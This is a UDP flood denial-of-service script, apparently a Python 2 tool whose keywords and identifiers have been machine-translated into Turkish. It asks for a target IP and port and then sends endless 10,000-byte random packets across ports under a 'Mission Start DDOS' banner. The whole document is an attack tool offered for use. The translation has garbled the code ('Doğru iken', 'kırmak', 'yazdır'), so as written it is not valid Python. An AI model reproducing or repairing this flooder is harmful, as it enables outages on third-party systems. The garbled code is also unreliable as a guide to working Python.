#!/usr/bin

ithalat sistemi
işletim sistemini içe aktar
ithalat zamanı
ithalat soketi
rastgele içe aktar
#Kod Zamanı
tarih saatinden içe aktarma tarih saatinden
şimdi = tarihsaat.now()
saat = şimdi.saat
dakika = şimdi.dakika
gün = şimdi.gün
ay = şimdi.ay
yıl = şimdi.yıl

############## Ayarlar ##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bayt = rastgele._urandom(10000)
zaman aşımı = zaman.zaman()
############# Ayarlar ##############

os.system ("temizle")
Yazdır ('''
\033[91m
      :::::::::::::::::::::::::::::::::::::::::::: ::::::
     :+: :+: :+: :+: :+: :+:+: :+: :+: :+:      
    +:+ +:+ +:+ +:+ +:+ :+:+:+ +:+ +:+ +:+       
   +#++:++#+ +#+ +:+ +#+ +#+ +:+ +#+ +#++:++# +#+        
  +#+ +#+ +#+ +#+ +#+ +#+ +#+#+# +#+ +#+         
 #+# #+# #+# #+# #+# #+# #+#+# #+# #+#          
######### ######## ### ### #### ########## ###           
                               \033[92m[\033[91mGüçlendiren : Kod adı\033[92m]
                               \033[93m[\033[94m127.0.0.1\033[93m]\033[95m|_|\033[93m[\033[94m127.217.21.78\033[93m]                                                                         
'')
ip = raw_input("IP Hedefi: ")
port = input("Port : ")

os.system("temizle")
"\033[91mMission Start DDOS" yazdır
"\033[91m[ ] %0" yazdır
zaman.uyku(5)
"\033[92m[===== ] %25" yazdır
zaman.uyku(5)
yazdır "\033[92m[========== ] %50"
zaman.uyku(5)
yazdır "\033[92m[============== ] %75"
zaman.uyku(5)
yazdır "\033[92m[====================] %100"
zaman.uyku(3)
os.system ("temizle")
gönderildi = 0
Doğru iken:
     1 iken:
        if time.time() > zaman aşımı:
            kırmak
        Başka:
            geçmek
     sock.sendto(bayt, (ip,bağlantı noktası))
     gönderildi = gönderildi + 1
     bağlantı noktası = bağlantı noktası + 1
     "\033[92m%s paketini %s bağlantı noktasına gönderdi:%s başarılı"%(gönderildi,ip,bağlantı noktası) yazdır
     eğer bağlantı noktası == 65534:
       bağlantı noktası = 1
